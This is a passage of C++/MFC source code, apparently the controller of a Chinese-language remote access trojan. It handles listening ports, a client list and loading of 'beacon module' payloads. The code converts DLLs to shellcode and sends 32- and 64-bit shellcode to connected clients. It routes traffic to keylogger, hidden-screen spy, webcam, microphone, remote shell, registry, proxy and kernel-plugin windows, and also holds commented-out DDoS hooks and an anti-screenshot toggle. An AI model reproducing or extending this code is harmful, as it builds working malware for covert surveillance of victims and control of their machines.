						g_pLogView->InsertLogItem(_T("失败"), m_portinfo->ip);
						g_pLogView->InsertLogItem(_T("协议"), m_portinfo->m_net);
						g_pLogView->InsertLogItem(_T("端口"), m_portinfo->m_net);
					}
					else
					{
						bAddListen++;
					}
				}
				if (bAddListen < m_num) m_wndStatusBar.SetPaneText(1, _T("监听失败"));
			}
		}
	}
	::RegCloseKey(hKEY);
	SAFE_DELETE_AR(B_portinfo);
	SAFE_DELETE(m_portinfo);


	pwndPanemonitor->Select();
	pwndPaneLog->Select();
	pwndPanePlug->Select();
	pwndPaneBuild->Select();
	//pwndPaneDDOS->Select();
	//pwndPaneChart->Select();
	pwndPanelist->Select();

}

//IP地理位置
void CMainFrame::initializeSEU_QQwry()
{
	OUT_PUT_FUNCION_NAME_INFO
		TCHAR DatPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	*_tcsrchr(DatPath, _T('\\')) = '\0';
	CString cstrFileFullPath_qqwry;
	cstrFileFullPath_qqwry = DatPath;
	cstrFileFullPath_qqwry += _T("\\Plugins\\x86\\qqwry.dat");

	// 判断文件是否存在
	bool bFileExist = PathFileExists(cstrFileFullPath_qqwry)
		&& (!PathIsDirectory(cstrFileFullPath_qqwry));
	if (false == bFileExist)
	{
		log_信息("qqwry不存在 到 https://www.cz88.net/下载 ");
	}

	hFile = CreateFile(cstrFileFullPath_qqwry, 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_gQQwry = new SEU_QQwry;
		m_gQQwry->SetPath(cstrFileFullPath_qqwry);
		CloseHandle(hFile);
	}
}
BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	OUT_PUT_FUNCION_NAME_INFO

		//	cs.style &= ~WS_MAXIMIZEBOX;//禁用最大化按钮
		cs.style &= ~(LONG)FWS_ADDTOTITLE;
	cs.style |= WS_CLIPCHILDREN | WS_CLIPSIBLINGS;
	cs.lpszName = TITLENAME;
	// 设置窗口大小 
	cs.cx = 1200;
	cs.cy = 700;
	if (!CFrameWnd::PreCreateWindow(cs))
		return FALSE;
	return TRUE;
}

CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	static	int nID = 1000;
	nID++;
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0, x, y), direction, pNeighbour);

	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);

	CFrameWnd* pFrame = new CFrameWnd;

	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = g_pTabView->GetDocument();// GetActiveView()->GetDocument();

	pFrame->Create(NULL, NULL, WS_CHILD | WS_VISIBLE | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);

	m_mapPanes.SetAt(nID, pFrame);

	return pwndPane;
}

BOOL CMainFrame::adddCXTPToolBar()
{
	OUT_PUT_FUNCION_NAME_INFO

		// Initialize the command bars
		if (!InitCommandBars())
		{
			OUT_PUT_FUNCION_NAME_FATAL
				return FALSE;
		}


	// Get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if (pCommandBars == NULL)
	{
		OUT_PUT_FUNCION_NAME_FATAL
			TRACE0("Failed to create command bars object.\n");
		return FALSE;      // fail to create
	}

	// 添加菜单栏
/*	CXTPCommandBar* pMenuBar = pCommandBars->SetMenu(
		_T("Menu Bar"), IDR_MAINFRAME);
	if(pMenuBar == NULL)
	{
		TRACE0("Failed to create menu bar.\n");
		return -1;      // fail to create
	}*/

	// 创建工具栏


	CXTPToolBar* pToolBar = (CXTPToolBar*)pCommandBars->Add(_T("功能"), xtpBarTop);
	if (!pToolBar || !pToolBar->LoadToolBar(IDR_TOOLBAR_RIGHTMENU))
	{
		OUT_PUT_FUNCION_NAME_FATAL
			TRACE0("Failed to create toolbar\n");
		return FALSE;
	}

	pToolBar->ShowTextBelowIcons(TRUE);



	return TRUE;

}






// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}

#endif //_DEBUG


// CMainFrame message handlers


void CMainFrame::OnClose()
{
	log_信息("关闭提示窗口");
	m_wndTip.DestroyWindow();


	m_TrayIcon.RemoveIcon();
	log_信息("关闭通信端口");
	g_pSocketBase->Shutdown();
	delete  g_pSocketBase;


	// Save the current state for toolbars and menus.
	log_信息("保存窗口布局");
	SaveCommandBars(((CQuickApp*)AfxGetApp())->g_Exename);

	log_信息("关闭虚拟SDK");
	MyBoxedAppSDK_Exit();

	log_信息("关闭日志 正常退出");
	SAFE_DELETE(logger);
#ifdef _DEBUG
	_CrtDumpMemoryLeaks();
#endif
	CFrameWnd::OnClose();
}



void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		if (m_wndTip)
			m_wndTip.Hide();
	switch (nID)
	{
	case IDM_XVID:
	{
		MessageBox(_T("下载安装XVID视频压缩库"), _T("https://www.xvid.com/"));
		const TCHAR szOperation[] = _T("open");
		const TCHAR szAddress[] = _T("https://www.xvid.com/");
		HINSTANCE hRslt = ShellExecute(NULL, szOperation, szAddress, NULL, NULL, SW_SHOWNORMAL);
	}
	break;
	case IDM_REBUILDTOOL:
	{
		adddCXTPToolBar();
	}
	break;
	case SC_MINIMIZE:
	{
		m_TrayIcon.MinimizeToTray(this);
		m_TrayIcon.ShowBalloonTip(_T("右键关闭 "), _T("双击还原"), NIIF_NONE, 10);
	}
	break;
	case SC_CLOSE:
	{
		ShowWindow(SW_HIDE);
	}
	break;
	default:
		CXTPFrameWnd::OnSysCommand(nID, lParam);
		break;
	}
}

LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		if (wParam == XTP_DPN_CONTEXTMENU)
		{
			XTP_DOCKINGPANE_CLICK* pClick = (XTP_DOCKINGPANE_CLICK*)lParam;

			if (pClick->pPane)
			{
				CMenu menu;
				VERIFY(menu.CreatePopupMenu());
				menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("&(D)浮动窗口"));
				menu.AppendMenu(MF_SEPARATOR, NULL);
				menu.AppendMenu(MF_STRING | MF_ENABLED, 101, _T("&(A)停靠窗口"));
				CPoint	p;
				GetCursorPos(&p);
				int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
				menu.DestroyMenu();
				if (!nMenuResult) 	return TRUE;
				if (pClick->pPane == pwndPanelist) 	return TRUE;

				switch (nMenuResult)
				{
				case 100:
				{
					m_paneManager.FloatPane(pClick->pPane, CRect(0, 0, 800, 600));
					pClick->pPane->SetOptions(xtpPaneHasMenuButton | xtpPaneNoHideable);
				}
				break;
				case 101:
				{
					m_paneManager.AttachPane(pClick->pPane, pwndPanelist);
					pClick->pPane->SetOptions(xtpPaneNoCloseable | xtpPaneNoCaption | xtpPaneNoHideable);
				}
				break;

				}
			}
			return TRUE;
		}

	if (wParam == XTP_DPN_SHOWWINDOW)
	{
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		if (!pPane->IsValid())
		{
			CWnd* pWnd = NULL;
			if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
				pPane->Attach(pWnd);
		}
		else
		{
			m_wndTip.Hide();
			if (pPane->IsFloating())
			{
				pPane->SetOptions(xtpPaneHasMenuButton | xtpPaneNoHideable);
				return TRUE;
			}

			if (pPane == pwndPanelist)
				m_paneManager.HideClient(FALSE);
			else
				m_paneManager.HideClient(TRUE);

			if (pPane == pwndPanemonitor)
				showStatusBar(TRUE);
			else
				showStatusBar(FALSE);
			m_wndStatusBar.Invalidate(TRUE);
		}
		return TRUE;
	}

	if (wParam == XTP_DPN_CLOSEPANE)
	{
		CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
		m_paneManager.AttachPane(pPane, pwndPanelist);
		pPane->SetOptions(xtpPaneNoCloseable | xtpPaneNoCaption | xtpPaneNoHideable);
		return XTP_ACTION_NOCLOSE;
		return TRUE;
	}

	return FALSE;
}


void CMainFrame::showStatusBar(BOOL bshow)
{
	static BOOL bsame = TRUE;
	if (bsame == bshow) return;
	bsame = bshow;
	pPaneW->SetVisible(bshow, FALSE);
	pZoomPaneW->SetVisible(bshow, FALSE);
	pPaneH->SetVisible(bshow, FALSE);
	pZoomPaneH->SetVisible(bshow, FALSE);
	pPaneF->SetVisible(bshow, FALSE);
	pZoomPaneF->SetVisible(bshow, FALSE);

	if (bshow)
	{
		m_wndStatusBar.UpdateAllPanes(TRUE, TRUE);
	}

}


void CMainFrame::OnButton_Monitor_W()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	for (int i = 1; i < 21; i++)
	{
		CString tem;
		tem.Format(_T("显示%d列"), i);
		menu.AppendMenu(MF_STRING | MF_ENABLED, 100 + i, tem);

		menu.EnableMenuItem(100 + i, MF_BYCOMMAND | MF_ENABLED);
	}
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	menu.DestroyMenu();
	if (!nMenuResult)
		return;
	m_nZoom_w = nMenuResult - 100;
	g_pScreenMonitorDlg->ReShowPic(0, m_nZoom_w);
	Invalidate(TRUE);
}

void CMainFrame::OnZoomSliderScroll_W(NMHDR* pNMHDR, LRESULT* pResult)
{
	NMXTPSCROLL* pNMScroll = (NMXTPSCROLL*)pNMHDR;
	CXTPStatusBarSliderPane* pPane = DYNAMIC_DOWNCAST(CXTPStatusBarSliderPane, pNMScroll->pSender);
	if (!pPane)
		return;
	int nZoom = m_nZoom_w;
	switch (pNMScroll->nSBCode)
	{
	case SB_TOP: nZoom = 100; break;
	case SB_BOTTOM: nZoom = 1000; break;

	case SB_LINEUP: nZoom = max(((nZoom / 10) - 1) * 10, 100); break;
	case SB_LINEDOWN: nZoom = min(((nZoom / 10) + 1) * 10, 1000); break;

	case SB_THUMBTRACK: nZoom = pNMScroll->nPos; break;

	case SB_PAGEUP: nZoom = max(nZoom - 50, 100); break;
	case SB_PAGEDOWN: nZoom = min(nZoom + 50, 1000); break;
	}
	if (nZoom == m_nZoom_w)
		return;
	m_nZoom_w = nZoom;
	pPane->SetPos(nZoom);
	CXTPStatusBar* pStatusBar = pPane->GetStatusBar();
	CXTPStatusBarPane* pPaneZoomIndicator = pStatusBar->FindPane(ID_MONITOR_W);
	if (pPaneZoomIndicator)
	{
		CString strZoom;
		strZoom.Format(_T("宽度%d"), m_nZoom_w);
		pPaneZoomIndicator->SetText(strZoom);
	}
	*pResult = 1;
	g_pScreenMonitorDlg->ReShowPic(0, m_nZoom_w);
	Invalidate(TRUE);
}

void CMainFrame::OnButton_Monitor_H()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	for (int i = 1; i < 21; i++)
	{
		CString tem;
		tem.Format(_T("显示%d行"), i);
		menu.AppendMenu(MF_STRING | MF_ENABLED, 100 + i, tem);
	}
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	menu.DestroyMenu();
	if (!nMenuResult) 	return;

	m_nZoom_h = nMenuResult - 100;
	g_pScreenMonitorDlg->ReShowPic(1, m_nZoom_h);
	Invalidate(TRUE);
}

void CMainFrame::OnZoomSliderScroll_H(NMHDR* pNMHDR, LRESULT* pResult)
{
	NMXTPSCROLL* pNMScroll = (NMXTPSCROLL*)pNMHDR;
	CXTPStatusBarSliderPane* pPane = DYNAMIC_DOWNCAST(CXTPStatusBarSliderPane, pNMScroll->pSender);
	if (!pPane)
		return;
	int nZoom = m_nZoom_h;
	switch (pNMScroll->nSBCode)
	{
	case SB_TOP: nZoom = 100; break;
	case SB_BOTTOM: nZoom = 1000; break;

	case SB_LINEUP: nZoom = max(((nZoom / 10) - 1) * 10, 100); break;
	case SB_LINEDOWN: nZoom = min(((nZoom / 10) + 1) * 10, 1000); break;

	case SB_THUMBTRACK: nZoom = pNMScroll->nPos; break;

	case SB_PAGEUP: nZoom = max(nZoom - 50, 100); break;
	case SB_PAGEDOWN: nZoom = min(nZoom + 50, 1000); break;
	}
	if (nZoom == m_nZoom_h)
		return;
	m_nZoom_h = nZoom;
	pPane->SetPos(nZoom);
	CXTPStatusBar* pStatusBar = pPane->GetStatusBar();
	CXTPStatusBarPane* pPaneZoomIndicator = pStatusBar->FindPane(ID_MONITOR_H);
	if (pPaneZoomIndicator)
	{
		CString strZoom;
		strZoom.Format(_T("高度%d"), m_nZoom_h);
		pPaneZoomIndicator->SetText(strZoom);
	}
	*pResult = 1;
	g_pScreenMonitorDlg->ReShowPic(1, m_nZoom_h);
	Invalidate(TRUE);
}

void CMainFrame::OnButton_Monitor_F()
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	for (int i = 1; i < 21; i++)
	{
		CString tem;
		tem.Format(_T("帧数%d/s"), i);
		menu.AppendMenu(MF_STRING | MF_ENABLED, 100 + i, tem);
	}
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	menu.DestroyMenu();
	if (!nMenuResult) 	return;

	m_nZoom_f = nMenuResult - 100;
	g_pScreenMonitorDlg->ReShowPic(2, 1000 / m_nZoom_f);
	pZoomPaneF->SetPos(1000 / m_nZoom_f);
	CString strZoom;
	strZoom.Format(_T("刷新%.2fs"), (1000 / (double)m_nZoom_f) / 1000);
	pPaneF->SetText(strZoom);

	Invalidate(TRUE);
}

void CMainFrame::OnZoomSliderScroll_F(NMHDR* pNMHDR, LRESULT* pResult)
{
	NMXTPSCROLL* pNMScroll = (NMXTPSCROLL*)pNMHDR;
	CXTPStatusBarSliderPane* pPane = DYNAMIC_DOWNCAST(CXTPStatusBarSliderPane, pNMScroll->pSender);
	if (!pPane)
		return;
	int nZoom = m_nZoom_f;
	switch (pNMScroll->nSBCode)
	{
	case SB_TOP: nZoom = 50; break;
	case SB_BOTTOM: nZoom = 3000; break;

	case SB_LINEUP: nZoom = max((nZoom - 50), 50); break;
	case SB_LINEDOWN: nZoom = min((nZoom + 50), 3000); break;

	case SB_THUMBTRACK: nZoom = pNMScroll->nPos; break;

	case SB_PAGEUP: nZoom = max(nZoom - 200, 50); break;
	case SB_PAGEDOWN: nZoom = min(nZoom + 200, 3000); break;
	}
	if (nZoom == m_nZoom_f)
		return;
	m_nZoom_f = nZoom;
	pPane->SetPos(nZoom);
	CXTPStatusBar* pStatusBar = pPane->GetStatusBar();
	CXTPStatusBarPane* pPaneZoomIndicator = pStatusBar->FindPane(ID_MONITOR_F);
	if (pPaneZoomIndicator)
	{
		CString strZoom;
		strZoom.Format(_T("刷新%.2f  s"), ((double)m_nZoom_f) / 1000);
		pPaneZoomIndicator->SetText(strZoom);
	}
	*pResult = 1;
	g_pScreenMonitorDlg->ReShowPic(2, m_nZoom_f);
	Invalidate(TRUE);
}



void CMainFrame::OnLockButton()
{
	OUT_PUT_FUNCION_NAME_INFO
		CLockDlg dlg(CWnd::GetDesktopWindow());
	dlg.DoModal();

}

void CMainFrame::OnHiddenButton()
{
	OUT_PUT_FUNCION_NAME_INFO
#ifdef ANTISCREENSHOT
		static bool bAntishot = true;
	if (bAntishot)
	{
		typedef BOOL(__stdcall* SetWindowDisplayAffinity)(HWND  hWnd, DWORD dwAffinity);
		SetWindowDisplayAffinity fnSetWindowDisplayAffinity;
		HINSTANCE	User32handle = ::LoadLibrary(_T("User32.dll"));
		if (User32handle != NULL)
		{
			fnSetWindowDisplayAffinity = (SetWindowDisplayAffinity)GetProcAddress(User32handle, "SetWindowDisplayAffinity");
			if (fnSetWindowDisplayAffinity)
			{
				HWND handle = this->GetSafeHwnd();
				fnSetWindowDisplayAffinity(handle, 0x00000000); //0x00000000
			}
			FreeLibrary(User32handle);
		}
		bAntishot = false;
	}
	else
	{
		typedef BOOL(__stdcall* SetWindowDisplayAffinity)(HWND  hWnd, DWORD dwAffinity);
		SetWindowDisplayAffinity fnSetWindowDisplayAffinity;
		HINSTANCE	User32handle = ::LoadLibrary(_T("User32.dll"));
		if (User32handle != NULL)
		{
			fnSetWindowDisplayAffinity = (SetWindowDisplayAffinity)GetProcAddress(User32handle, "SetWindowDisplayAffinity");
			if (fnSetWindowDisplayAffinity)
			{
				HWND handle = this->GetSafeHwnd();
				fnSetWindowDisplayAffinity(handle, 0x00000001); //0x00000000
			}
			FreeLibrary(User32handle);
		}
		bAntishot = true;
	}
#endif // ANTISCREENSHOT

}

void CMainFrame::OnMenuitemShow()
{
	OUT_PUT_FUNCION_NAME_INFO
		if (!IsWindowVisible())
		{
			m_TrayIcon.MaximizeFromTray(this);
			//	m_TrayIcon.HideIcon();
		}
		else
		{
			m_TrayIcon.MinimizeToTray(this);
			//	m_TrayIcon.ShowIcon();
		}

}


void CMainFrame::InitShellcode()
{
	OUT_PUT_FUNCION_NAME_INFO
		TCHAR strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf) * sizeof(TCHAR));
	CString FileName = strSelf;
	FileName.Format(_T("%s\\Plugins\\x86\\上线模块.dll_bin"), FileName.Mid(0, FileName.ReverseFind('\\')));
	HANDLE hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		log_警告("本地文件 payload32 未找到 ,无法使用payload32加载上线模块");
		return;
	}
	ShellcodeSize32 = GetFileSize(hFile, NULL);
	Shellcode32 = new BYTE[ShellcodeSize32];
	DWORD dwReadsA = 0;
	ReadFile(hFile, Shellcode32, ShellcodeSize32, &dwReadsA, NULL);
	CloseHandle(hFile);

	CString FileName64 = strSelf;
	FileName64.Format(_T("%s\\Plugins\\x64\\上线模块.dll_bin"), FileName64.Mid(0, FileName64.ReverseFind('\\')));
	hFile = CreateFile(FileName64, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		log_警告("本地文件 payload64 未找到 ,无法使用payload64加载上线模块");
		return;
	}
	ShellcodeSize64 = GetFileSize(hFile, NULL);
	Shellcode64 = new BYTE[ShellcodeSize64];
	dwReadsA = 0;
	ReadFile(hFile, Shellcode64, ShellcodeSize64, &dwReadsA, NULL);
	CloseHandle(hFile);
}



void CMainFrame::WriteResource(bool iswin64, TCHAR* lp_path, TCHAR* lp_filename, int lpszType, TCHAR* lpresname, bool bwrite, bool buildshellcode, char* param)
{
	PluginsInfo* p_PluginsInfo = new PluginsInfo;
	CString str;
	str = lp_path;
	iswin64 ? str += _T("\\Plugins\\x64\\") : str += _T("\\Plugins\\x86\\");
	str += lp_filename;
	HANDLE h_Skinfile = (*MyBoxedAppSDK_CreateVirtualFileW)(str, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
	char* pBuffer = NULL;
	DWORD dwSize;
	HRSRC   hResource = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(lpszType), lpresname);
	if (hResource)
	{
		HGLOBAL   hg = LoadResource(GetModuleHandle(NULL), hResource);
		if (hg)
		{
			pBuffer = (char*)LockResource(hg);
			if (pBuffer)
			{
				dwSize = SizeofResource(GetModuleHandle(NULL), hResource);
				DWORD dwTemp;

				if (bwrite)	WriteFile(h_Skinfile, pBuffer, dwSize, &dwTemp, NULL);
				p_PluginsInfo->filedate = (BYTE*)pBuffer;
				p_PluginsInfo->filesize = dwSize;
				string s_tmp = MD5((void*)pBuffer, dwSize).toString();
				int size = MultiByteToWideChar(CP_ACP, 0, s_tmp.c_str(), -1, NULL, 0);
				MultiByteToWideChar(CP_ACP, 0, s_tmp.c_str(), -1, p_PluginsInfo->Version, size);

				iswin64 ? m_PluginsDate_x64.insert(MAKE_PAIR(PluginsDate, lp_filename, p_PluginsInfo)) : m_PluginsDate_x86.insert(MAKE_PAIR(PluginsDate, lp_filename, p_PluginsInfo));
				CloseHandle(h_Skinfile);

			}
		}
	}
	if (buildshellcode)
	{
		CStringA str_in;
		CStringA str_out;
		str_in = str;
		str_out = str;
		str_out += "_bin";
		if (strcmp(param, "0") == 0)
		{
			dll_to_shellcode(0, param, str_in, str_out);
		}
		else
		{
			dll_to_shellcode(1, param, str_in, str_out);
		}
		hFile = CreateFileA(str_out, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			log_严重("WriteResource，读取BIN出错");
			return;
		}
		DWORD len = GetFileSize(hFile, NULL);
		char* binbuffer = new char[len];
		ZeroMemory(binbuffer, sizeof(binbuffer));
		DWORD wr = 0;
		ReadFile(hFile, binbuffer, len + 1, &wr, NULL);
		PluginsInfo* p_PluginsInfo_bin = new PluginsInfo;
		p_PluginsInfo_bin->filedate = (BYTE*)binbuffer;
		p_PluginsInfo_bin->filesize = len;
		string s_tmp = MD5((void*)binbuffer, len).toString();
		int size = MultiByteToWideChar(CP_ACP, 0, s_tmp.c_str(), -1, NULL, 0);
		MultiByteToWideChar(CP_ACP, 0, s_tmp.c_str(), -1, p_PluginsInfo_bin->Version, size);
		lstrcat(lp_filename, _T("_bin"));
		iswin64 ? m_PluginsDate_x64.insert(MAKE_PAIR(PluginsDate, lp_filename, p_PluginsInfo_bin)) : m_PluginsDate_x86.insert(MAKE_PAIR(PluginsDate, lp_filename, p_PluginsInfo_bin));
		CloseHandle(hFile);
	}
}

void CMainFrame::WriteandReadPlugins()
{
	OUT_PUT_FUNCION_NAME_INFO
		TCHAR strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf) * sizeof(TCHAR));
	CString str_path = strSelf;
	str_path = str_path.Mid(0, str_path.ReverseFind('\\'));
	for (int i = 0; i < sizeof(plugins_Dates_32) / sizeof(PLUGINS); i++)
	{
		WriteResource(false, str_path.GetBuffer(), plugins_Dates_32[i].DllPath, plugins_Dates_32[i].RType, _T("PLUGINS"), true, plugins_Dates_32[i].buildshellcode, plugins_Dates_32[i].param);
	}
	for (int i = 0; i < sizeof(plugins_Dates_64) / sizeof(PLUGINS); i++)
	{
		WriteResource(true, str_path.GetBuffer(), plugins_Dates_64[i].DllPath, plugins_Dates_64[i].RType, _T("PLUGINS64"), true, plugins_Dates_64[i].buildshellcode, plugins_Dates_64[i].param);
	}
	WriteResource(false, str_path.GetBuffer(), _T("upx.exe"), IDR_UPX, _T("UPX"), true);
	WriteResource(false, str_path.GetBuffer(), _T("cmd.txt"), IDR_TEXT_CMD, _T("TEXT"), true);
	WriteResource(false, str_path.GetBuffer(), _T("qqwry.dat"), IDR_QQWRY, _T("QQWRY"), true);


}

void CMainFrame::GetPluginVersion(TCHAR* dllname, TCHAR* Version, SENDTASK sendtask, BOOL bisx86)
{
	switch (sendtask)
	{
	case TASK_MAIN:
	{
		PluginsDate* m_PlugsDate = NULL;
		if (bisx86)
			m_PlugsDate = &m_PluginsDate_x86;
		else
			m_PlugsDate = &m_PluginsDate_x64;
		PluginsDate::iterator it_PluginsDate = m_PlugsDate->find(dllname);
		if (it_PluginsDate != m_PlugsDate->end())
		{
			PluginsInfo* p_PluginsInfo = it_PluginsDate->second;
			memcpy(Version, p_PluginsInfo->Version, 100);
		}
	}
	break;
	case TASK_PLUG:
	{
		PluginsDate* m_PlugsDate = NULL;
		if (bisx86)
			m_PlugsDate = &g_pCPlugView->m_PlugsDatex86;
		else
			m_PlugsDate = &g_pCPlugView->m_PlugsDatex64;
		PluginsDate::iterator it_PluginsDate = m_PlugsDate->find(dllname);
		if (it_PluginsDate != m_PlugsDate->end())
		{
			PluginsInfo* p_PluginsInfo = it_PluginsDate->second;
			memcpy(Version, p_PluginsInfo->Version, 100);
		}
	}
	break;
	default:
		break;
	}

}

////////////////////////////////////回调函数
void CALLBACK CMainFrame::NotifyProc(ClientContext* pContext, UINT nCode)
{
	pContext->m_clcs_send_rec_close.lock();

	switch (nCode)
	{
	case NC_CLIENT_CONNECT:
		break;
	case NC_CLIENT_DISCONNECT:
	{
		if (!pContext->m_bIsMainSocket)
		{
			// 关闭相关窗口
			switch (pContext->m_Dialog[0])
			{
			case FILEMANAGER_DLG:		//文件管理
			case SCREENSPY_DIF_DLG:		//差异屏幕
			case SCREENSPY_QUICK_DLG:	//高速屏幕
			case SCREENSPY_PLAY_DLG:	//娱乐屏幕
			case SCREENSPY_HIDE_DLG:	//后台屏幕
			case WEBCAM_DLG:			//摄像头
			case AUDIO_DLG:				//麦克风
			case SPEAKER_DLG:			//扬声器 
			case CHAT_DLG:				//对话
			case SHELL_DLG:				//终端
			case PROXY_DLG:				//代理
			case KEYBOARD_DLG:			//键盘	
			case REGEDIT_DLG:			//注册表
			case MACHINE_DLG:			//系统管理
			case KERNEL_DLG:			//驱动插件
			case EXPAND_DLG:			//互动插件窗口
			{
				::PostMessage(((CDialog*)pContext->m_Dialog[1])->GetSafeHwnd(), WM_CLOSE, NULL, NULL);
			}
			break;
			case DDDOS_DLG_IN:
			{
				//pContext->m_Dialog[0] = DDDOS_DLG_OUT;
				//p_CDDOSAttackDlg->PostMessage(WM_DDOS_CLIENT, NULL, (LPARAM)pContext);
			}
			break;
			}

		}
		else if (pContext->pView && pContext->m_bIsMainSocket)
		{
			if (pContext->m_Dialog[1] == MONITOR_DLG)
			{
				g_pScreenMonitorDlg->DelClient(pContext);
			}
			SAFE_DELETE_AR(pContext->ScreenPicture);
			TRACE("((CQuickView*)(pContext->pView))->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)(pContext->LoginInfo)); %d %d  \n", pContext, pContext->LoginInfo);

			if (pContext->LoginInfo)
				((CView*)(pContext->pView))->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)(pContext->LoginInfo));

		}
	}
	break;
	case NC_TRANSMIT:
		break;
	case NC_RECEIVE:
		g_pFrame->ProcessReceive(pContext);
		break;
	case NC_RECEIVE_COMPLETE:
		g_pFrame->ProcessReceiveComplete(pContext);
		break;
	case NC_SEND_SHELCODE_32:
		g_pFrame->ProcessSendShellcode(pContext, 0);
		break;
	case NC_SEND_SHELCODE_64:
		g_pFrame->ProcessSendShellcode(pContext, 1);
		break;
	}
	pContext->m_clcs_send_rec_close.unlock();
}



//处理接收数据
void CMainFrame::ProcessReceiveComplete(ClientContext* pContext)
{
	if ((pContext == NULL))
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];

	if (pContext->m_DeCompressionBuffer.GetBuffer(0)[0] == TOKEN_HEARTBEAT)
	{
		if (bbusy)
		{
			BYTE	bToken[2] = { TOKEN_HEARTBEAT, 0 };
			g_pSocketBase->Send(pContext, (LPBYTE)&bToken,2);
		}
		else
		{
			BYTE	bToken[2] = { TOKEN_HEARTBEAT,1 };
			g_pSocketBase->Send(pContext, (LPBYTE)&bToken,2);
		}
	
		return;
	}
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case	SCREENSPY_DIF_DLG:		//差异屏幕
			((CDifScreenSpyDlg*)dlg)->OnReceiveComplete();
			break;
		case	SCREENSPY_QUICK_DLG:	//高速屏幕
			((CQuickScreenSpyDlg*)dlg)->OnReceiveComplete();
			break;
		case	SCREENSPY_PLAY_DLG:		//娱乐屏幕
			((H264CScreenSpyDlg*)dlg)->OnReceiveComplete();
			break;;
		case	SCREENSPY_HIDE_DLG:		//后台屏幕
			((CHideScreenSpyDlg*)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:      //视频查看
			((CWebCamDlg*)dlg)->OnReceiveComplete();
			break;
		case FILEMANAGER_DLG: //文件管理
			((CFileManagerDlg*)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:    //键盘记录
			((CKeyBoardDlg*)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:       //GSM麦克风监听
			((CAudioDlg*)dlg)->OnReceiveComplete();
			break;
		case SPEAKER_DLG:		//扬声器
			((CSpeakerDlg*)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:       //远程终端
			((CShellDlg*)dlg)->OnReceiveComplete();
			break;
		case MACHINE_DLG:     //主机管理
			((CMachineDlg*)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:     //查注册表
			((CRegeditDlg*)dlg)->OnReceiveComplete();
			break;
		case CHAT_DLG:        //远程交谈
			((CChat*)dlg)->OnReceiveComplete();
			break;
		case PROXY_DLG:			//代理
			((CProxyMapDlg*)dlg)->OnReceiveComplete();
			break;
		case EXPAND_DLG:		//注入管理
			((CExpandDlg*)dlg)->OnReceiveComplete();
			break;
		case KERNEL_DLG:		//注入管理
			((CKernelDlg*)dlg)->OnReceiveComplete();
			break;
		default:
			TRACE("	if (pContext->m_Dialog[0] > 0) 非法数据 %s");
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
